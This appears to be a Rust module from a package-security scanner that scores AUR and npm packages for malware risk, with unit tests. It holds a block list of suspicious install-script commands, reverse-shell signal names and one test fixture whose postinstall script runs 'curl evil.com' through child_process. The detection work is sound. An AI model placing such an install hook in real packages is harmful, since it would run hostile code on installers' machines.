use crate::shared::models::{MaintainerInfo, NpmPackageInfo};
use serde::Serialize;

/// A signal emitted by a feature during analysis.
#[derive(Debug, Clone, Serialize)]
pub struct Signal {
    pub id: String,
    pub category: SignalCategory,
    pub points: u32,
    pub description: String,
    pub is_override_gate: bool,
    /// If true, this signal alone is sufficient to classify the package as Malicious (trust 0).
    pub is_critical: bool,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub matched_line: Option<String>,
}

/// The four weighted signal categories.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
pub enum SignalCategory {
    Metadata,
    Pkgbuild,
    Behavioral,
    Temporal,
}

/// Trust tier derived from the final score.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize)]
pub enum Tier {
    Trusted,
    Ok,
    Sketchy,
    Suspicious,
    Malicious,
}

/// Complete result of scanning a package.
#[derive(Debug, Serialize)]
pub struct ScanResult {
    pub package: String,
    pub score: u32,
    pub tier: Tier,
    pub signals: Vec<Signal>,
    pub override_gate_fired: Option<String>,
}

/// Context data required by the scoring engine (extracted from PackageContext).
pub struct ScoreInput<'a> {
    pub maintainer_info: Option<&'a MaintainerInfo>,
    pub votes: u32,
    pub popularity: f64,
    pub has_orphan_takeover: bool,
    pub has_new_malicious_diff: bool,
    pub npm_info: Option<&'a NpmPackageInfo>,
    pub has_community_malware_warning: bool,
}

/// Category weights for the weighted risk calculation.
const WEIGHT_METADATA: f64 = 0.15;
const WEIGHT_PKGBUILD: f64 = 0.45;
const WEIGHT_BEHAVIORAL: f64 = 0.25;
const WEIGHT_TEMPORAL: f64 = 0.15;

/// Security keywords for AUR comment malware detection.
const SECURITY_KEYWORDS: &[&str] = &[
    "malware",
    "backdoor",
    "trojan",
    "keylogger",
    "cryptominer",
    "ransomware",
    "rootkit",
    "compromised",
    "virus",
    "suspicious",
    "malicious",
    "spyware",
    "unsafe",
    "dangerous",
    "phishing",
    "exploit",
];

/// NPM install script commands that are considered suspicious.
const NPM_SUSPICIOUS_COMMANDS: &[&str] = &[
    "eval",
    "exec",
    "child_process",
    "curl",
    "wget",
    "base64",
    "bash",
    "sh ",
];

/// Compute the final score and tier using the context-aware scoring pipeline.
///
/// Pipeline order:
/// 1. Community malware warning → Malicious (trust 0)
/// 2. Critical gate signals → Malicious (trust 0)
/// 3. Override gate signals → Malicious (risk = max(gate_points, weighted_risk))
/// 4. Base weighted risk from remaining signals
/// 5. Maintainer trust multiplier
/// 6. Popularity penalties
/// 7. Orphan + malicious diff boost
/// 8. NPM suspicion risk
/// 9. Clamp → trust → tier
pub fn compute_score(package_name: &str, signals: &[Signal], input: &ScoreInput) -> ScanResult {
    // ── 1. Community malware warning override ──
    if input.has_community_malware_warning {
        let override_gate = signals
            .iter()
            .find(|s| s.id == "M-COMMENTS-SECURITY");
        return ScanResult {
            package: package_name.to_string(),
            score: 0,
            tier: Tier::Malicious,
            signals: signals.to_vec(),
            override_gate_fired: override_gate.map(|s| s.id.clone()),
        };
    }

    // ── 2. Critical gate signals ──
    let critical = signals.iter().find(|s| s.is_critical);
    if let Some(sig) = critical {
        return ScanResult {
            package: package_name.to_string(),
            score: 0,
            tier: Tier::Malicious,
            signals: signals.to_vec(),
            override_gate_fired: Some(sig.id.clone()),
        };
    }

    // ── 3. Override gate signals (legacy behaviour: Malicious with max-risk) ──
    let best_override = signals
        .iter()
        .filter(|s| s.is_override_gate)
        .max_by_key(|s| s.points);

    if let Some(signal) = best_override {
        let weighted_risk = compute_weighted_risk(signals);
        let risk = (signal.points as u32).max(weighted_risk).min(100);
        return ScanResult {
            package: package_name.to_string(),
            score: 100 - risk,
            tier: Tier::Malicious,
            signals: signals.to_vec(),
            override_gate_fired: Some(signal.id.clone()),
        };
    }

    // ── 4. Base weighted risk ──
    let base_risk = compute_weighted_risk(signals) as f64;

    // ── 5. Maintainer trust multiplier ──
    let m_trust = input
        .maintainer_info
        .as_ref()
        .map(|m| maintainer_trust_factor(m))
        .unwrap_or(0.5); // neutral when no info
    // trust_factor 0..1 → risk multiplier 1.5 when trust 0, 0.8 when trust 1
    let trust_multiplier = lerp(1.5, 0.8, m_trust);
    let mut risk = base_risk * trust_multiplier;

    // ── 6. Popularity penalty ──
    if input.votes == 0 && input.popularity == 0.0 {
        risk += 15.0;
    } else if input.votes < 3 && input.popularity < 0.01 {
        risk += 5.0;
    }

    // ── 7. Orphan takeover + new malicious diff boost ──
    if input.has_orphan_takeover && input.has_new_malicious_diff {
        risk = risk.max(95.0);
    }

    // ── 8. NPM suspicion risk ──
    if let Some(npm) = input.npm_info {
        risk += npm_suspicion_risk(npm) as f64;
    }

    // ── 9. Clamp, trust, tier ──
    risk = risk.clamp(0.0, 100.0);
    let trust = (100.0 - risk).round() as u32;
    let tier = score_to_tier(trust);

    ScanResult {
        package: package_name.to_string(),
        score: trust,
        tier,
        signals: signals.to_vec(),
        override_gate_fired: None,
    }
}

/// Compute the weighted composite risk from signals (without override gate logic).
fn compute_weighted_risk(signals: &[Signal]) -> u32 {
    let mut meta_total: u32 = 0;
    let mut pkgbuild_total: u32 = 0;
    let mut behavioral_total: u32 = 0;
    let mut temporal_total: u32 = 0;

    for signal in signals {
        match signal.category {
            SignalCategory::Metadata => meta_total += signal.points,
            SignalCategory::Pkgbuild => pkgbuild_total += signal.points,
            SignalCategory::Behavioral => behavioral_total += signal.points,
            SignalCategory::Temporal => temporal_total += signal.points,
        }
    }

    meta_total = meta_total.min(100);
    pkgbuild_total = pkgbuild_total.min(100);
    behavioral_total = behavioral_total.min(100);
    temporal_total = temporal_total.min(100);

    let weighted = (WEIGHT_METADATA * meta_total as f64)
        + (WEIGHT_PKGBUILD * pkgbuild_total as f64)
        + (WEIGHT_BEHAVIORAL * behavioral_total as f64)
        + (WEIGHT_TEMPORAL * temporal_total as f64);

    (weighted.round() as u32).min(100)
}

/// Compute maintainer trust factor: 0.0 (very suspicious) to 1.0 (fully trusted).
fn maintainer_trust_factor(info: &MaintainerInfo) -> f64 {
    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_secs();

    let age_days = (now.saturating_sub(info.account_created_date)) as f64 / 86400.0;

    // Base trust on account age (older is better, up to 1 year to reach 1.0)
    let age_trust = (age_days / 365.0).clamp(0.0, 1.0);

    // Package count contribution (more packages = more experience)
    let count_trust = (info.number_of_packages as f64 / 10.0).clamp(0.2, 1.0);

    // Takeover penalty: if not original submitter, reduce trust based on recency
    let takeover_penalty = if info.is_original_submitter {
        1.0
    } else {
        match info.days_since_takeover {
            None => 0.0,                           // orphan takeover but no info → worst case
            Some(d) => (d as f64 / 30.0).clamp(0.0, 1.0), // reach full trust after 30 days
        }
    };

    // Combine: weight takeover and age more heavily
    0.3 * age_trust + 0.2 * count_trust + 0.5 * takeover_penalty
}

/// Compute additional NPM suspicion risk (0-30 points).
pub(crate) fn npm_suspicion_risk(info: &NpmPackageInfo) -> u32 {
    let mut risk: u32 = 0;

    // Inspect install scripts for suspicious commands
    let all_scripts = format!(
        "{} {} {}",
        info.scripts.preinstall, info.scripts.install, info.scripts.postinstall
    );
    let lower = all_scripts.to_lowercase();

    let has_suspicious = NPM_SUSPICIOUS_COMMANDS
        .iter()
        .any(|cmd| lower.contains(cmd));

    if has_suspicious {
        risk += 25;
    } else if !all_scripts.trim().is_empty()
        && !all_scripts.contains("node-gyp rebuild")
        && !all_scripts.contains("node-pre-gyp install")
        && !all_scripts.contains("tsc")
    {
        risk += 15; // unexpected script
    }

    // NPM maintainer reputation
    if info.maintainer_account_age < 90 {
        risk += 10;
    }
    if info.maintainer_package_count == 1 {
        risk += 5;
    }

    // GitHub repo signals
    if !info.github_repo_exists {
        risk += 10;
    } else {
        if info.github_stars == 0 {
            risk += 5;
        }
        if info.github_commit_freshness > 180 {
            risk += 5;
        }
    }

    risk.min(30)
}

/// Check if any AUR comments contain security keywords.
/// Used externally by coordinator to set `has_community_malware_warning`.
pub fn comment_contains_malware_warning(comments: &[String]) -> bool {
    comments.iter().any(|c| {
        let lower = c.to_lowercase();
        SECURITY_KEYWORDS.iter().any(|kw| lower.contains(kw))
    })
}

/// Linear interpolation: a + (b - a) * t
fn lerp(a: f64, b: f64, t: f64) -> f64 {
    a + (b - a) * t
}

fn score_to_tier(trust: u32) -> Tier {
    match trust {
        0..=20 => Tier::Malicious,
        21..=40 => Tier::Suspicious,
        41..=60 => Tier::Sketchy,
        61..=80 => Tier::Ok,
        _ => Tier::Trusted,
    }
}

impl std::fmt::Display for Tier {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Tier::Trusted => write!(f, "TRUSTED"),
            Tier::Ok => write!(f, "OK"),
            Tier::Sketchy => write!(f, "SKETCHY"),
            Tier::Suspicious => write!(f, "SUSPICIOUS"),
            Tier::Malicious => write!(f, "MALICIOUS"),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn signal(id: &str, category: SignalCategory, points: u32, override_gate: bool) -> Signal {
        signal_crit(id, category, points, override_gate, false)
    }

    fn signal_crit(
        id: &str,
        category: SignalCategory,
        points: u32,
        override_gate: bool,
        is_critical: bool,
    ) -> Signal {
        Signal {
            id: id.to_string(),
            category,
            points,
            description: String::new(),
            is_override_gate: override_gate,
            is_critical,
            matched_line: None,
        }
    }

    fn empty_input() -> ScoreInput<'static> {
        ScoreInput {
            maintainer_info: None,
            votes: 10,
            popularity: 1.0,
            has_orphan_takeover: false,
            has_new_malicious_diff: false,
            npm_info: None,
            has_community_malware_warning: false,
        }
    }

    #[test]
    fn no_signals_scores_full_trust() {
        let result = compute_score("pkg", &[], &empty_input());
        assert_eq!(result.score, 100);
        assert_eq!(result.tier, Tier::Trusted);
        assert!(result.override_gate_fired.is_none());
    }

    #[test]
    fn override_gate_picks_highest() {
        let signals = vec![
            signal("P-CURL-PIPE", SignalCategory::Pkgbuild, 90, true),
            signal("P-REVSHELL-DEVTCP", SignalCategory::Pkgbuild, 95, true),
        ];
        let result = compute_score("pkg", &signals, &empty_input());
        assert_eq!(result.tier, Tier::Malicious);
        assert_eq!(
            result.override_gate_fired.as_deref(),
            Some("P-REVSHELL-DEVTCP")
        );
        assert!(result.score <= 5, "Trust {} should be <= 5", result.score);
    }

    #[test]
    fn override_gate_uses_weighted_when_higher() {
        let signals = vec![
            signal("P-REVSHELL-PYTHON", SignalCategory::Pkgbuild, 85, true),
            signal("P-EVAL-BASE64", SignalCategory::Pkgbuild, 85, false),
            signal("B-NAME-IMPERSONATE", SignalCategory::Behavioral, 65, false),
            signal("M-VOTES-ZERO", SignalCategory::Metadata, 30, false),
            signal("T-MALICIOUS-DIFF", SignalCategory::Temporal, 55, false),
        ];
        let result = compute_score("pkg", &signals, &empty_input());
        assert_eq!(result.tier, Tier::Malicious);
        // Weighted risk: 0.45*100 + 0.25*65 + 0.15*30 + 0.15*55 = 74
        // Override gate risk: 85. Max(85, 74) = 85. Trust = 100 - 85 = 15
        assert!(
            result.score <= 15,
            "Trust {} should be <= 15",
            result.score
        );
    }

    #[test]
    fn category_caps_at_100() {
        let signals = vec![
            signal("P-A", SignalCategory::Pkgbuild, 80, false),
            signal("P-B", SignalCategory::Pkgbuild, 80, false),
        ];
        let result = compute_score("pkg", &signals, &empty_input());
        // Pkgbuild: min(160, 100) = 100 -> 0.45 * 100 = 45 base risk
        // Neutral maintainer trust: 0.5 -> multiplier = lerp(1.5, 0.8, 0.5) = 1.15
        // risk = 45 * 1.15 ≈ 52 -> trust ≈ 48, tier = Sketchy
        assert_eq!(result.score, 48);
        assert_eq!(result.tier, Tier::Sketchy);
    }

    #[test]
    fn tier_boundaries() {
        assert_eq!(score_to_tier(0), Tier::Malicious);
        assert_eq!(score_to_tier(20), Tier::Malicious);
        assert_eq!(score_to_tier(21), Tier::Suspicious);
        assert_eq!(score_to_tier(40), Tier::Suspicious);
        assert_eq!(score_to_tier(41), Tier::Sketchy);
        assert_eq!(score_to_tier(60), Tier::Sketchy);
        assert_eq!(score_to_tier(61), Tier::Ok);
        assert_eq!(score_to_tier(80), Tier::Ok);
        assert_eq!(score_to_tier(81), Tier::Trusted);
        assert_eq!(score_to_tier(100), Tier::Trusted);
    }

    #[test]
    fn min_trust_is_zero() {
        let signals = vec![
            signal("P", SignalCategory::Pkgbuild, 200, false),
            signal("M", SignalCategory::Metadata, 200, false),
            signal("B", SignalCategory::Behavioral, 200, false),
            signal("T", SignalCategory::Temporal, 200, false),
        ];
        let result = compute_score("pkg", &signals, &empty_input());
        assert_eq!(result.score, 0);
    }

    // ── New tests for context-aware scoring ──

    #[test]
    fn community_malware_warning_overrides_everything() {
        let signals = vec![
            signal("P-SAFE", SignalCategory::Pkgbuild, 5, false),
        ];
        let input = ScoreInput {
            has_community_malware_warning: true,
            ..empty_input()
        };
        let result = compute_score("pkg", &signals, &input);
        assert_eq!(result.score, 0);
        assert_eq!(result.tier, Tier::Malicious);
    }

    #[test]
    fn critical_signal_forces_malicious() {
        let signals = vec![
            signal_crit("CRIT-SHELL", SignalCategory::Pkgbuild, 95, false, true),
            signal("P-SAFE", SignalCategory::Pkgbuild, 5, false),
        ];
        let result = compute_score("pkg", &signals, &empty_input());
        assert_eq!(result.score, 0);
        assert_eq!(result.tier, Tier::Malicious);
        assert_eq!(result.override_gate_fired.as_deref(), Some("CRIT-SHELL"));
    }

    #[test]
    fn popularity_zero_penalty() {
        let signals = vec![
            signal("P-CURL", SignalCategory::Pkgbuild, 30, false),
        ];
        let input = ScoreInput {
            votes: 0,
            popularity: 0.0,
            ..empty_input()
        };
        let result = compute_score("pkg", &signals, &input);
        // weighted: 0.45*30=13.5 → 14, +15 penalty = 29 risk, trust=71, tier=OK
        // with neutral maintainer trust 0.5: 14 * 1.15 = 16.1 + 15 = 31.1 risk, trust ≈ 69
        assert!(result.score < 75, "Trust {} should be < 75", result.score);
    }

    #[test]
    fn orphan_plus_malicious_diff_boost() {
        let signals = vec![
            signal("P-CURL", SignalCategory::Pkgbuild, 30, false),
        ];
        let input = ScoreInput {
            has_orphan_takeover: true,
            has_new_malicious_diff: true,
            ..empty_input()
        };
        let result = compute_score("pkg", &signals, &input);
        // Risk ≥ 95 → trust ≤ 5 → Malicious
        assert_eq!(result.tier, Tier::Malicious);
        assert!(result.score <= 5, "Trust {} should be <= 5", result.score);
    }

    #[test]
    fn maintainer_trust_lowers_risk() {
        // Trusted maintainer: 2-year account, 20 packages, original submitter
        let now = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_secs();
        let info = MaintainerInfo {
            account_created_date: now - 730 * 86400, // 2 years ago
            number_of_packages: 20,
            is_original_submitter: true,
            days_since_takeover: None,
        };
        let trust = maintainer_trust_factor(&info);
        assert!(trust > 0.9, "Trusted maintainer should have high trust factor, got {trust}",);
    }

    #[test]
    fn new_maintainer_with_takeover_is_suspicious() {
        let now = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_secs();
        let info = MaintainerInfo {
            account_created_date: now - 10 * 86400, // 10 days ago
            number_of_packages: 1,
            is_original_submitter: false,
            days_since_takeover: Some(2), // 2 days ago
        };
        let trust = maintainer_trust_factor(&info);
        assert!(
            trust < 0.3,
            "New takeover maintainer should have low trust factor, got {trust}"
        );
    }

    #[test]
    fn npm_suspicion_detects_suspicious_scripts() {
        let info = NpmPackageInfo {
            scripts: crate::shared::models::NpmScripts {
                preinstall: String::new(),
                install: String::new(),
                postinstall: "node -e \"require('child_process').exec('curl evil.com')\""
                    .to_string(),
            },
            maintainer_account_age: 30,
            maintainer_package_count: 1,
            github_repo_exists: false,
            github_stars: 0,
            github_commit_freshness: 365,
        };
        let risk = npm_suspicion_risk(&info);
        // 25 (suspicious cmd) + 10 (account < 90d) + 5 (single pkg) + 10 (no repo) = 50, capped at 30
        assert_eq!(risk, 30);
    }

    #[test]
    fn npm_suspicion_clean_package_zero() {
        let info = NpmPackageInfo {
            scripts: crate::shared::models::NpmScripts {
                preinstall: String::new(),
                install: "node-gyp rebuild".to_string(),
                postinstall: String::new(),
            },
            maintainer_account_age: 365,
            maintainer_package_count: 5,
            github_repo_exists: true,
            github_stars: 100,
            github_commit_freshness: 10,
        };
        let risk = npm_suspicion_risk(&info);
        assert_eq!(risk, 0);
    }

    #[test]
    fn comment_keyword_detection() {
        assert!(comment_contains_malware_warning(&[
            "This package contains malware!".to_string()
        ]));
        assert!(comment_contains_malware_warning(&[
            "Suspicious activity detected".to_string()
        ]));
        assert!(!comment_contains_malware_warning(&[
            "Great package, works well!".to_string()
        ]));
        assert!(!comment_contains_malware_warning(&[]));
    }
}
